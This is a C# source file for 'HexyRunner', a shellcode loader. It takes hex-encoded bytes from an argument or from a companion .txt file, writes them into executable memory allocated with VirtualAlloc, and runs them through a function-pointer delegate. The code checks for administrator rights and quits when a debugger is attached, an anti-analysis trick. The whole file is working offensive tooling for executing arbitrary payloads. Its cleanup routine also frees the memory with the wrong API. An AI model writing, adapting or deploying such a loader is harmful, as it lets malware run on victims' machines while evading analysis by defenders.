using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Principal;

namespace HexyRunner
{
    class ShellcodeExec
    {
        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(IntPtr p, IntPtr s, IntPtr t, IntPtr m);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void WindowsRun();

        private static byte[] Str2ByteArray(string hexString) {
            return Enumerable.Range(0, hexString.Length).Where(n => n % 2 == 0).Select(
                n => Convert.ToByte(hexString.Substring(n, 2), 16)
            ).ToArray();
        }

        private static bool IsValidShellcode(string hexString) {
            return Regex.IsMatch(hexString, @"\A\b([0-9a-fA-F]{2}\s*)+\z");
        }

        private static bool IsInputValid(string input) {
            return !string.IsNullOrEmpty(input);
        }

        private static IntPtr SecureVirtualAlloc(int size) {
            IntPtr pointer = VirtualAlloc(IntPtr.Zero, (IntPtr)size, (IntPtr)0x1000, (IntPtr)0x40);
            if (pointer == IntPtr.Zero) {
                throw new Exception("Memory allocation failed.");
            }
            return pointer;
        }

        private static void CleanMemory(IntPtr pointer) {
            // Placeholder for memory clean-up logic
            if (pointer != IntPtr.Zero) {
                Marshal.ZeroFreeCoTaskMemUnicode(pointer);
                pointer = IntPtr.Zero;
            }
        }

        private static bool IsElevated() {
            using (var identity = WindowsIdentity.GetCurrent()) {
                var principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        private static void Log(string message) {
            string logFilePath = "execution.log";
            File.AppendAllText(logFilePath, $"{DateTime.Now}: {message}\n");
        }

        private static bool CheckFileAccessible(string filePath) {
            try {
                using (FileStream fs = File.Open(filePath, FileMode.Open, FileAccess.Read)) { }
                return true;
            } catch {
                return false;
            }
        }

        private static bool IsShellcodeLengthValid(int length) {
            return length > 0 && length <= 65536; // Example limit, adjust as necessary
        }

        private static void AntiDebug() {
            if (Debugger.IsAttached) {
                Environment.Exit(1); // Exit if debugger is attached
            }
        }

        private static void ExitCleanup(IntPtr pointer) {
            CleanMemory(pointer);
            Log("Exiting and cleaning up resources.");
        }

        public static void Main(string[] args)
        {
            try
            {
                string input;

                if (args.Length > 0)
                    input = args[0];
                else
                {
                    string fileName = Process.GetCurrentProcess().MainModule.FileName;
                    fileName = fileName.Substring(0, fileName.LastIndexOf(".")) + ".txt";
                    if (File.Exists(fileName))
                    {
                        if (!CheckFileAccessible(fileName))
                        {
                            Log("File not accessible: " + fileName);
                            return;
                        }
                        input = File.ReadAllText(fileName).Trim();
                    }
                    else
                    {
                        Log("No input provided and file does not exist.");
                        return;
                    }
                }

                if (!IsInputValid(input) || !IsValidShellcode(input))
                {
                    Log("Invalid input.");
                    return;
                }

                input = Regex.Replace(input, @"\s+", string.Empty);
                byte[] hexy = Str2ByteArray(input);

                if (!IsShellcodeLengthValid(hexy.Length))
                {
                    Log("Shellcode length invalid.");
                    return;
                }

                IntPtr pointer = SecureVirtualAlloc(hexy.Length);
                Marshal.Copy(hexy, 0, pointer, hexy.Length);
                
                if (IsElevated())
                {
                    Log("Running shellcode with elevated privileges.");
                }

                AntiDebug();

                WindowsRun runner = (WindowsRun)Marshal.GetDelegateForFunctionPointer(pointer, typeof(WindowsRun));
                runner();

                ExitCleanup(pointer);
            }
            catch (Exception ex)
            {
                Log($"Error: {ex.Message}");
            }
        }
    }
}
